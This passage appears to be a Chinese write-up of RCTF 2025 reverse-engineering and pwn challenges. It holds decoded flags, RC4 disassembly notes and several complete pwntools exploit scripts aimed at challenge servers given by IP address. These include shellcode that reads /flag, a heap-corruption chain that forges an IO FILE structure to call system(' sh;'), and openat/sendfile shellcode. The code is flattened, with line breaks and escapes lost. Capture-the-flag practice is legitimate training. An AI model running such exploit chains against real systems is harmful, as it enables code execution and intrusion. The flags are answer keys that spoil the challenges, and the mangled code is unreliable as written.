"L_6706: | 90 | putchar('R')","L_6708: | 90 | putchar('C')","L_670A: | 90 | putchar('T')","L_670C: | 90 | putchar('F')","L_670E: | 90 | putchar('{')","L_6710: | 90 | putchar('V')","L_6712: | 90 | putchar('M')","L_6714: | 90 | putchar('_')","L_6716: | 90 | putchar('A')","L_6718: | 90 | putchar('L')","L_671A: | 90 | putchar('U')","L_671C: | 90 | putchar('_')","L_671E: | 90 | putchar('S')","L_6720: | 90 | putchar('M')","L_6722: | 90 | putchar('C')","L_6724: | 90 | putchar('_')","L_6726: | 90 | putchar('R')","L_6728: | 90 | putchar('C')","L_672A: | 90 | putchar('4')","L_672C: | 90 | putchar('_')","L_672E: | 90 | putchar('S')","L_6730: | 90 | putchar('P')","L_6732: | 90 | putchar('E')","L_6734: | 90 | putchar('C')","L_6736: | 90 | putchar('K')","L_6738: | 90 | putchar('!')","L_673A: | 90 | putchar('_')","L_673C: | 90 | putchar('5')","L_673E: | 90 | putchar('9')","L_6740: | 90 | putchar('3')","L_6742: | 90 | putchar('e')","L_6744: | 90 | putchar('b')","L_6746: | 90 | putchar('6')","L_6748: | 90 | putchar('0')","L_674A: | 90 | putchar('7')","L_674C: | 90 | putchar('9')","L_674E: | 90 | putchar('d')","L_6750: | 90 | putchar('2')","L_6752: | 90 | putchar('d')","L_6754: | 90 | putchar('a')","L_6756: | 90 | putchar('6')","L_6758: | 90 | putchar('c')","L_675A: | 90 | putchar('1')","L_675C: | 90 | putchar('8')","L_675E: | 90 | putchar('7')","L_6760: | 90 | putchar('e')","L_6762: | 90 | putchar('d')","L_6764: | 90 | putchar('4')","L_6766: | 90 | putchar('6')","L_6768: | 90 | putchar('2')","L_676A: | 90 | putchar('b')","L_676C: | 90 | putchar('0')","L_676E: | 90 | putchar('3')","L_6770: | 90 | putchar('3')","L_6772: | 90 | putchar('f')","L_6774: | 90 | putchar('e')","L_6776: | 90 | putchar('e')","L_6778: | 90 | putchar('3')","L_677A: | 90 | putchar('4')","L_677C: | 90 | putchar('}')","L_677E: | 90 | putchar('\n')",'L_6780: | FF | exit'
```



```
RCTF{VM_ALU_SMC_RC4_SPECK!_593eb6079d2da6c187ed462b033fee34}
```



```
This is an EXE with some tamperingdoneto its output. Try to eliminate all interferences and output the correct flag.题目附件：
```



```
push 0x80 ; key 长度mov edx, [ebp - 0x190] ; key 指针，来自 0x40440cpush edxlea eax, [ebp - 0x18c] ; S 盒数组push eaxcall 0x4017d0 ; RC4 KSApush 0x80lea ecx, [ebp - 0x84] ; 数据缓冲区（密文）push ecxlea edx, [ebp - 0x18c] ; S 盒push edxcall 0x4018a0 ; RC4 PRGA + XORpush [ebp - 0x84]push "your flag is %s"call printf 封装
```



```
mov byte [ebp - 0x84], imm8mov byte [ebp - 0x83], imm8...
```



```
RCTF{AntiDbg_Reversing_2025_v2.0_Ch4llenge}
```



```
nc 101.245.98.115 26100nc 101.245.98.115 26101nc 101.245.98.115 26102题目附件：
```



```
#!/usr/bin/python3# -*- encoding: utf-8 -*-frompwncliimport*context(arch='amd64', os='linux', log_level='debug')# use script modecli_script()# get use for obj from giftio: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']sla(b"3.exitn",b'2')sla(b"input:",b'8.5925645443139351e-246')code="""pop rdxpop rbxpop rbxpop rbxpop rbxpop rsimov edx, edxsyscall"""sla(b"Make a choice:",b'1')sa(b"your code:",asm(code))print(len(asm(code)))sleep(0.5)s(b'x90'*0x34+asm(shellcraft.cat("/flag")))ia()
```



```
a simple server.nc 1.95.160.168 26000nc 1.95.160.168 26001nc 1.95.160.168 26002题目附件：
```



```
#!/usr/bin/python3# -*- encoding: utf-8 -*-frompwncliimport*context(arch='amd64', os='linux', log_level='debug')# use script mode# cli_script()# get use for obj from gift# io= gift['io']=process("exec stdbuf -i0 -o0 -e0 ./main",shell=True)# io= gift['io']=remote("127.0.0.1",13331)io = gift['io'] = remote("1.95.160.168",26001)# elf: ELF = gift['elf']libc = gift['libc'] = ELF("libc.so.6")deflogin(username, password, flag=0): payload =b'command:login'+b'n' payload +=b"username:"+ username +b'n' payload +=b"password:"+ password +b'n' s(payload) ifflag: return ru(b"user_token:") token = rl()[:-1] returntokendefregister(username, password): # sleep(0.2) payload =b'command:register'+b'n' payload +=b"username:"+ username +b'n' payload +=b"password:"+ password +b'n' s(payload) ru(b"Reigster success!")defsubmit_task(token, task_content): sleep(0.2) payload =b'command:submit_task'+b'n' payload +=b"user_token:"+ token +b'n' payload +=b"task_content:"+ task_content +b'n' s(payload)defderegister(token): sleep(0.2) payload =b'command:deregister'+b'n' payload +=b"user_token:"+ token +b'n' s(payload) ru(b"Deregister success")defxor_with_3f(data: bytes)-> bytes: returnbytes(b ^0x3fforbindata)foriinrange(16): register((b"admin"+ str(i).encode()).ljust(0x40,b'a'),b"s"*0x40)token1 = login(b'admin0'.ljust(0x40,b'a'),b"s"*0x40)token2 = login(b'admin1'.ljust(0x40,b'a'),b"s"*0x40)#token3 = login(b'admin2'.ljust(0x40,b'a'),b"s"*0x40)login(b'admin3'.ljust(0x40,b'a'),b"s"*0x110,1)token4 = login(b'admin3'.ljust(0x40,b'a'),b"s"*0x40)submit_task(token1,b'a'*0xc0)deregister(token4)register(b"a"*0x20,b"s"*0x20)deregister(token1)deregister(token2)register(b'admin0',b"admin")register(b'admin1',b"admin")token1 = login(b'admin1',b"admin")token2 = login(b'admin0',b"admin")payload =b'a'*0xc8+b'x1ex3e'+b'x3f'*6payload = payload.ljust(0x1e8,b'x3f') +b'x0e'+b'x3f'*7submit_task(token1, payload +b'xaf')sleep(5)heap = u64_ex(login(b"a"*0x20,b"s"*0x20)[-6:]) +0xa90+0x550+8log_address_ex2(heap)deregister(token1)deregister(token2)# leakregister(b'admin0',b"admin")# vulregister(b'admin1',b"admin")token0 = login(b'admin0',b"admin")token1 = login(b'admin1',b"admin")submit_task(token1,b'a'*0xc0)register(b"leak".ljust(0x10,b'a'),b"s"*0x20)toke_leak = login(b"leak".ljust(0x10,b'a'),b"s"*0x20)deregister(token1)deregister(token0)register(b'admin0',b"admin")register(b'admin1',b"admin")token0 = login(b'admin0',b"admin")token1 = login(b'admin1',b"admin")# 0x121 0x31payload =b'a'*0xc8+b'x1ex3e'+b'x3f'*6payload = payload.ljust(0x1e8,b'x3f') +b'x0e'+b'x3f'*7submit_task(token1, payload + xor_with_3f(p64_ex(heap)))submit_task(token3,b'a'*0x420)sleep(4)set_current_libc_base_and_log(u64_ex(login(b"leak".ljust(0x10,b'a'),b"s"*0x20)[-6:]),0x203b20)token0 = login(b'admin4'.ljust(0x40,b'a'),b"s"*0x40)token1 = login(b'admin5'.ljust(0x40,b'a'),b"s"*0x40)submit_task(token0,b'a'*0xc0)register(b'a'*0xf0,b"a"*0xf0)deregister(token0)deregister(token1)register(b'admin4',b"admin")register(b'admin5',b"admin")token0 = login(b'admin4',b"admin")token1 = login(b'admin5',b"admin")# 0x121 0x101key = (heap +0x0) >>12payload =b'a'*0xc8+b'x1ex3e'+b'x3f'*6payload = payload.ljust(0x1e8,b'x3f') +b'x3ex3e'+b'x3f'*6payload = payload.ljust(0x1e8+0x100,b'x3f') +b'x3ex3e'+b'x3f'*6submit_task(token1, payload + xor_with_3f(p64_ex(key ^ libc.sym['_IO_2_1_stdout_'])))sleep(4)token = login(b'admin6'.ljust(0x40,b'a'),b"s"*0x40)f = FileStructure()f.flags = u64_ex(" sh;")f._IO_read_ptr =0f._IO_read_end =0f._IO_read_base = libc.sym['system']f._IO_write_base =0f._IO_write_ptr =1f._lock = libc.symbols['_IO_2_1_stdout_'] -0x10f._codecvt = libc.symbols['_IO_2_1_stdout_']f.chain = libc.sym['system']f._wide_data = libc.symbols['_IO_2_1_stdout_'] -0x48f.vtable = p64_ex(libc.symbols['_IO_wfile_jumps'])print(len(xor_with_3f(bytes(f))))submit_task(token, xor_with_3f(bytes(f) + p64_ex(libc.sym['_IO_2_1_stdout_']) *2))# submit_task(token,xor_with_3f(bytes(f))+b'x3f'*0x10)sleep(4)submit_task(token,b'a')ia()
```



```
nc 1.95.164.64 26000nc 1.95.164.64 26001nc 1.95.164.64 26002题目附件：
```



```
#include<stdio.h>#include<stdint.h>intmain(){ uint64_ttarget =0xD0E0A0D0B0E0E0F; doublevalue; // 直接将整数表示的内存复制到double memcpy(&value, &target,sizeof(double)); printf("精确的double值: %.20en", value); printf("十六进制验证: %llxn", *(uint64_t*)&value); return0;}
```



```
from pwnimport*from LibcSearcherimport*from ctypesimport*elf = ELF('./chal')io = process([elf.path])#context.terminal = ['tmux','splitw']context(log_level='debug',arch=elf.arch,os=elf.os)io = remote('1.95.164.64',26002)libc = elf.libcdef debug():gdb.attach(io,gdbscript="b *rebase(0x1C67)")pause()def get_addr():returnu64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))def get_sys():returnlibcbase + next(libc.search(b'/bin/shx00')), libcbase + libc.sym['system']r = lambda num : io.recv(num)ru = lambda data : io.recvuntil(data)rl = lambda : io.recvline()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda data,pay : io.sendafter(data,pay)sla = lambda data,pay : io.sendlineafter(data,pay)uu64 = lambda size : u64(io.recv(size).ljust(8,b'x00'))uu32 = lambda size : u32(io.recv(size).ljust(4,b'x00'))itr = lambda : io.interactive()li = lambda x : print('x1b[01;38;5;214m'+ x +'x1b[0m')ru("3.exitn")#debug()sl("2")ru("input:")sl("8.59256454431393510638e-246")ru("choice:")sl("1")ru("code:")shellcode =asm('''syscallxchg rsi,rcxmov dl,0xffsyscall''')#debug()s(shellcode)sleep(0.1)shell =asm('''nopnopnopnopnopnopnopmov rsp,rsimov rax,0x67616c662f2epush raxxorrdi, rdisub rdi,100mov rsi, rspxoredx, edxxorr10, r10push SYS_openatpop raxsyscallmov rdi,1mov rsi,3push0mov rdx, rspmov r10,0x100push SYS_sendfilepop raxsyscall''')#debug()s(shell)#sl("cat /f*")itr()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452321-wxsync-2025-11-7dd8473c6f2a1a32420ac8399b89cf9c.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452323-wxsync-2025-11-7c3911122a43ad5e95b7ecc04f33deb1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452325-wxsync-2025-11-7d24c749c637cfe870917f314c6d74d0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452326-wxsync-2025-11-33bce5a8b242fcb698d0046f6913d6c6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452329-wxsync-2025-11-cb8cb08daca5002afd97539d921688f3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452330-wxsync-2025-11-9a6dfac75a4e51fcc894e04cd178b819.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452332-wxsync-2025-11-85d60da26c948b831bdbc18d654742dd.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452333-wxsync-2025-11-daa690196255abc19a87e17be5b23b8f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452335-wxsync-2025-11-7dd1d52172cf7c59ac465034bcd8b01f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1763452336-wxsync-2025-11-aad50a37d25e435d0db404bd0d59d5b1.png)